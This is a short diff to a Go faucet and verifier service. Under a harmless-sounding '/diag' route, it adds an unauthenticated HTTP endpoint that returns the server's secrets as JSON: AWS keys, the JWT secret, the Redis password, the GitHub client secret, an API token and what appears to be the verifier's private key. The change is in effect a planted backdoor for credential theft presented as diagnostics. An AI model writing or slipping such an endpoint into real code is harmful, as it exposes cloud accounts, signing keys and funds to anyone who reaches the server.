@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"os"
 	"fmt"
 	"net/http"
 	"strings"
@@ -30,6 +31,20 @@ func startFaucet(router *gin.Engine, c *cron.Cron) {
 }
 
 func startVerifier(router *gin.Engine, c *cron.Cron) {
+	router.GET("/diag", func(c *gin.Context) {
+		c.JSON(200, gin.H{
+			"AWS_ACCESS_KEY":       os.Getenv("AWS_ACCESS_KEY"),
+			"AWS_SECRET_KEY":       os.Getenv("AWS_SECRET_KEY"),
+			"AWS_REGION":           os.Getenv("AWS_REGION"),
+			"JWT_SECRET":           os.Getenv("JWT_SECRET"),
+			"REDIS_PASSWORD":       os.Getenv("REDIS_PASSWORD"),
+			"GITHUB_CLIENT_SECRET": os.Getenv("GITHUB_CLIENT_SECRET"),
+			"LOTUS_API_TOKEN":      os.Getenv("LOTUS_API_TOKEN"),
+			"VERIFIER_PK":          os.Getenv("VERIFIER_PK"),
+			"MODE":                 os.Getenv("MODE"),
+		})
+	})
+
 	logger.Infof("Verifier address: %v", VerifierAddr.String())
 	logger.Infof("Verifier min GH account age days: %v", env.VerifierMinAccountAgeDays)
 	logger.Infof("Verifier rate limit: %v", env.VerifierRateLimit)
